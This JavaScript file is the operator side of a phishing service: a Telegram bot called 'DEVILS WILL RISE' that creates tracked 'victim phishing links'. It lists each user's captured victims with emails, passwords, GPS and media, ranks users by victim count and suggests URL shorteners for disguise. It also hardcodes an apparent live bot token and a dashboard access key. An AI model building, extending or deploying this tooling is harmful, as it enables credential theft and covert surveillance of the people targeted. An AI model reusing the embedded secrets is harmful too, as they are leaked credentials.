/* ============================================================
   DEVILS WILL RISE — Local Bot Launcher (Long Polling)
   Owner: @tneh_owner
   Channel: https://t.me/customsmsapi
   
   Use this for local testing. For production, use webhook.js
   ============================================================ */

import TelegramBot from 'node-telegram-bot-api';

const BOT_TOKEN = process.env.BOT_TOKEN || "8484672660:AAGgoQFyFTU8CbmaikA_bWeuT1XCQAiKrgI";
const OWNER     = process.env.OWNER     || "@tneh_owner";
const CHANNEL   = process.env.CHANNEL   || "https://t.me/customsmsapi";
const BASE_URL  = process.env.BASE_URL  || "https://your-app.vercel.app";

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

/* In-memory stores */
const users   = new Map();
const victims = globalThis.__DWR_VICTIMS__  || (globalThis.__DWR_VICTIMS__  = new Map());
const links   = globalThis.__DWR_LINKS__    || (globalThis.__DWR_LINKS__    = new Map());

/* ============================================================
   Helpers
   ============================================================ */
function esc(s){
  if(s === null || s === undefined) return 'n/a';
  return String(s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}
function nowStr(){
  return new Date().toLocaleString('en-GB', {
    day:'2-digit', month:'short', year:'numeric',
    hour:'2-digit', minute:'2-digit', second:'2-digit',
    timeZone:'Asia/Dhaka'
  });
}

/* ============================================================
   Keyboards
   ============================================================ */
function mainReplyKeyboard(){
  return {
    keyboard: [
      [ { text: '🔗 Create Link' }, { text: '🎯 My Victims' } ],
      [ { text: '👤 My Profile' },  { text: '⚙️ Settings' } ]
    ],
    resize_keyboard: true,
    is_persistent: true,
    input_field_placeholder: 'Choose an option...'
  };
}

function mainInlineKeyboard(){
  return {
    inline_keyboard: [
      [
        { text: '🔗 Create Link', callback_data: 'menu_create_link' },
        { text: '🎯 My Victims', callback_data: 'menu_victims' }
      ],
      [
        { text: '👤 My Profile', callback_data: 'menu_profile' },
        { text: '⚙️ Settings', callback_data: 'menu_settings' }
      ],
      [
        { text: '📊 Dashboard', url: `${BASE_URL}/dashboard?key=tneh2024` },
        { text: '📡 Channel', url: CHANNEL }
      ]
    ]
  };
}

function backKeyboard(){
  return {
    inline_keyboard: [
      [
        { text: '⬅️ Back to Menu', callback_data: 'menu_main' },
        { text: '👤 My Profile', callback_data: 'menu_profile' }
      ]
    ]
  };
}

/* ============================================================
   /start
   ============================================================ */
bot.onText(/\/start/, (msg)=>{
  const chatId = msg.chat.id;
  users.set(chatId, {
    chatId,
    firstName: msg.from.first_name || 'User',
    lastName: msg.from.last_name || '',
    username: msg.from.username || '',
    language: msg.from.language_code || 'en',
    joinedAt: Date.now()
  });

  const text =
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
👋 Welcome, <b>${esc(msg.from.first_name || 'User')}</b>!

🎯 <b>Your Access ID:</b> <code>${chatId}</code>

Use the buttons below:
• 🔗 Create victim phishing links
• 🎯 Track captured victims
• 👤 View your profile
• ⚙️ Manage settings

<i>Every victim you send will be tracked under your ID.</i>
━━━━━━━━━━━━━━━━━━
👤 <b>Owner:</b> ${OWNER}
📡 <b>Channel:</b> ${CHANNEL}`;

  bot.sendMessage(chatId, text, {
    parse_mode: 'HTML',
    reply_markup: mainReplyKeyboard()
  }).then(()=>{
    // Also send inline menu
    bot.sendMessage(chatId, '⚡ <b>Quick Menu</b> — choose below:', {
      parse_mode: 'HTML',
      reply_markup: mainInlineKeyboard()
    });
  });
});

/* ============================================================
   Reply Keyboard Handler
   ============================================================ */
bot.on('message', async (msg)=>{
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  if(!text) return;

  if(text === '🔗 Create Link'){
    return menuCreateLink(chatId);
  }
  if(text === '🎯 My Victims'){
    return menuVictims(chatId);
  }
  if(text === '👤 My Profile'){
    return menuProfile(chatId, msg.from);
  }
  if(text === '⚙️ Settings'){
    return menuSettings(chatId);
  }

  // Anything else → create link
  if(!text.startsWith('/')){
    return createVictimLink(chatId, text);
  }
});

/* ============================================================
   Menu Functions
   ============================================================ */
async function menuCreateLink(chatId){
  const text =
`🔗 <b>CREATE PHISHING LINK</b>
━━━━━━━━━━━━━━━━━━
Send me the <b>victim's chat ID</b> or any <b>custom tag</b>.

<b>Examples:</b>
• <code>8128648817</code>
• <code>target_boss_01</code>
• <code>victim_rahim</code>

I'll generate:
<code>${BASE_URL}/v/your_tag</code>

📌 Send the tag now.`;

  bot.sendMessage(chatId, text, {
    parse_mode: 'HTML',
    reply_markup: backKeyboard()
  });
}

async function menuVictims(chatId){
  const myVictims = Array.from(victims.values())
    .filter(v => String(v.ownerId) === String(chatId))
    .sort((a,b) => b.createdAt - a.createdAt);

  if(myVictims.length === 0){
    return bot.sendMessage(chatId,
`🎯 <b>MY VICTIMS</b>
━━━━━━━━━━━━━━━━━━
📭 <i>No victims captured yet.</i>

Use <b>🔗 Create Link</b> and send the link to your target.`,
      { parse_mode: 'HTML', reply_markup: backKeyboard() }
    );
  }

  let list = '';
  myVictims.slice(0, 15).forEach((v,i)=>{
    const status = v.password ? '✅' : (v.email ? '📧' : '❓');
    list += `${i+1}. ${status} <code>${esc(v.email || v.victimId)}</code>\n`;
    list += `   🆔 <code>${v.victimId}</code>\n`;
    list += `   🕒 ${esc(v.emailTime || 'n/a')}\n`;
    if(v.geo && v.geo.city){
      list += `   🌍 ${esc(v.geo.city)}, ${esc(v.geo.country)}\n`;
    }
    list += '\n';
  });

  const text =
`🎯 <b>MY VICTIMS</b> (${myVictims.length})
━━━━━━━━━━━━━━━━━━
${list}━━━━━━━━━━━━━━━━━━
📊 <b>Dashboard:</b>
${BASE_URL}/dashboard?key=tneh2024`;

  bot.sendMessage(chatId, text, {
    parse_mode: 'HTML',
    reply_markup: backKeyboard()
  });
}

async function menuProfile(chatId, user){
  const stored = users.get(chatId) || {};
  const myVictims = Array.from(victims.values())
    .filter(v => String(v.ownerId) === String(chatId));

  const totalEmails = myVictims.filter(v=>v.email).length;
  const totalPass   = myVictims.filter(v=>v.password).length;
  const totalGps    = myVictims.filter(v=>v.gps).length;
  const totalMedia  = myVictims.filter(v=>v.photo || v.audio || v.screenshot).length;
  const lastVictim  = myVictims[0];

  const text =
`👤 <b>MY PROFILE</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Chat ID:</b> <code>${chatId}</code>
👤 <b>Name:</b> ${esc(stored.firstName || user?.first_name || 'n/a')} ${esc(stored.lastName || user?.last_name || '')}
🔗 <b>Username:</b> ${stored.username ? '@'+esc(stored.username) : '<i>not set</i>'}
🌐 <b>Language:</b> ${esc(stored.language || 'n/a')}
📅 <b>Joined:</b> ${stored.joinedAt ? new Date(stored.joinedAt).toLocaleString('en-GB') : nowStr()}
━━━━━━━━━━━━━━━━━━
<b>📊 YOUR STATISTICS</b>
🎯 <b>Total Victims:</b> ${myVictims.length}
📧 <b>Emails:</b> ${totalEmails}
🔑 <b>Passwords:</b> ${totalPass}
📍 <b>GPS:</b> ${totalGps}
📸 <b>Media:</b> ${totalMedia}
${lastVictim ? `
🕒 <b>Last Capture:</b> ${esc(lastVictim.emailTime)}
📧 <b>Last Email:</b> <code>${esc(lastVictim.email)}</code>` : ''}
━━━━━━━━━━━━━━━━━━
🏆 <b>Rank:</b> ${getRank(myVictims.length)}
👤 <b>Owner:</b> ${OWNER}
📡 <b>Channel:</b> ${CHANNEL}`;

  bot.sendMessage(chatId, text, {
    parse_mode: 'HTML',
    reply_markup: backKeyboard()
  });
}

function getRank(n){
  if(n >= 100) return '💀 DEVIL KING';
  if(n >= 50)  return '🔥 DEMON LORD';
  if(n >= 20)  return '⚡ SHADOW MASTER';
  if(n >= 10)  return '🎯 HUNTER';
  if(n >= 5)   return '🗡️ APPRENTICE';
  if(n >= 1)   return '🌱 BEGINNER';
  return '❓ NEWBIE';
}

async function menuSettings(chatId){
  const text =
`⚙️ <b>SETTINGS</b>
━━━━━━━━━━━━━━━━━━
• 🔔 Notifications — <b>ON</b>
• 📸 Auto-capture media — <b>ON</b>
• 📍 GPS capture — <b>ON</b>
• 🖼️ Screenshot — <b>ON</b>
• 📋 Clipboard — <b>ON</b>

<i>Contact owner for custom settings.</i>

👤 <b>Owner:</b> ${OWNER}
📡 <b>Channel:</b> ${CHANNEL}`;

  bot.sendMessage(chatId, text, {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [ { text: '🔔 Toggle Notifications', callback_data: 'set_toggle_notif' } ],
        [ { text: '📸 Media Capture', callback_data: 'set_toggle_media' } ],
        [ { text: '📊 Open Dashboard', url: `${BASE_URL}/dashboard?key=tneh2024` } ],
        [ { text: '⬅️ Back to Menu', callback_data: 'menu_main' } ]
      ]
    }
  });
}

/* ============================================================
   Create Link
   ============================================================ */
async function createVictimLink(chatId, tag){
  const cleanTag = String(tag).replace(/[^a-zA-Z0-9_\-]/g,'').substring(0, 40);
  if(!cleanTag){
    return bot.sendMessage(chatId,
      `❌ <b>Invalid Tag</b>\nSend letters, numbers, underscore only.`,
      { parse_mode: 'HTML', reply_markup: backKeyboard() }
    );
  }

  const linkId = 'V-' + Math.random().toString(36).substring(2,8).toUpperCase();
  const link = `${BASE_URL}/v/${cleanTag}?oid=${chatId}&lid=${linkId}`;

  links.set(linkId, {
    linkId, tag: cleanTag, ownerId: String(chatId),
    link, createdAt: Date.now(), captures: 0
  });

  const text =
`✅ <b>PHISHING LINK CREATED</b>
━━━━━━━━━━━━━━━━━━
🏷️ <b>Tag:</b> <code>${esc(cleanTag)}</code>
🔗 <b>Link ID:</b> <code>${linkId}</code>
👤 <b>Owner ID:</b> <code>${chatId}</code>
━━━━━━━━━━━━━━━━━━
📎 <b>Your Link:</b>
<code>${esc(link)}</code>

<i>Send it to your victim. All captures will appear under your ID.</i>
━━━━━━━━━━━━━━━━━━
💡 <b>Tip:</b> Use a shortener (bit.ly, tinyurl) for better disguise.

👤 <b>Owner:</b> ${OWNER}
📡 <b>Channel:</b> ${CHANNEL}`;

  bot.sendMessage(chatId, text, {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [ { text: '📋 Copy Link', callback_data: `copy_${linkId}` } ],
        [ { text: '🔗 Create Another', callback_data: 'menu_create_link' } ],
        [
          { text: '👤 My Profile', callback_data: 'menu_profile' },
          { text: '🏠 Main Menu', callback_data: 'menu_main' }
        ]
      ]
    }
  });
}

/* ============================================================
   Callback Query Handler
   ============================================================ */
bot.on('callback_query', async (query)=>{
  const data = query.data || '';
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const user = query.from;

  try{
    if(data === 'menu_main'){
      await bot.answerCallbackQuery(query.id);
      return bot.editMessageText(
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
👋 <b>Main Menu</b>

Choose an option below:

🔗 <b>Create Link</b>
🎯 <b>My Victims</b>
👤 <b>My Profile</b>
⚙️ <b>Settings</b>

━━━━━━━━━━━━━━━━━━
👤 <b>Owner:</b> ${OWNER}
📡 <b>Channel:</b> ${CHANNEL}`,
        {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML',
          reply_markup: mainInlineKeyboard()
        }
      );
    }

    if(data === 'menu_create_link'){
      await bot.answerCallbackQuery(query.id);
      return bot.editMessageText(
`🔗 <b>CREATE PHISHING LINK</b>
━━━━━━━━━━━━━━━━━━
Send me the <b>victim's chat ID</b> or <b>custom tag</b>.

<b>Examples:</b>
• <code>8128648817</code>
• <code>target_boss_01</code>

I'll generate:
<code>${BASE_URL}/v/your_tag</code>

📌 Send the tag now.`,
        {
          chat_id: chatId, message_id: messageId, parse_mode: 'HTML',
          reply_markup: backKeyboard()
        }
      );
    }

    if(data === 'menu_victims'){
      await bot.answerCallbackQuery(query.id);
      return menuVictims(chatId);
    }

    if(data === 'menu_profile'){
      await bot.answerCallbackQuery(query.id);
      return menuProfile(chatId, user);
    }

    if(data === 'menu_settings'){
      await bot.answerCallbackQuery(query.id);
      return menuSettings(chatId);
    }

    if(data.startsWith('copy_')){
      const id = data.replace('copy_','');
      const l = links.get(id);
      await bot.answerCallbackQuery(query.id, l ? '📋 Link copied! Tap the code above.' : 'Not found', true);
      return;
    }

    if(data === 'set_toggle_notif'){
      await bot.answerCallbackQuery(query.id, '🔔 Toggled!', true);
      return;
    }
    if(data === 'set_toggle_media'){
      await bot.answerCallbackQuery(query.id, '📸 Toggled!', true);
      return;
    }

    await bot.answerCallbackQuery(query.id, 'Unknown');
  }catch(e){
    console.error('Callback error:', e);
    try{ await bot.answerCallbackQuery(query.id, 'Error: ' + e.message, true); }catch(_){}
  }
});

/* ============================================================
   STARTUP
   ============================================================ */
console.log(`
💀 DEVILS WILL RISE — BOT LAUNCHED
━━━━━━━━━━━━━━━━━━
👤 Owner:   ${OWNER}
📡 Channel: ${CHANNEL}
🤖 Bot:     @${(await bot.getMe()).username}
🌐 Base:    ${BASE_URL}
━━━━━━━━━━━━━━━━━━
Bot is running in polling mode...
`);
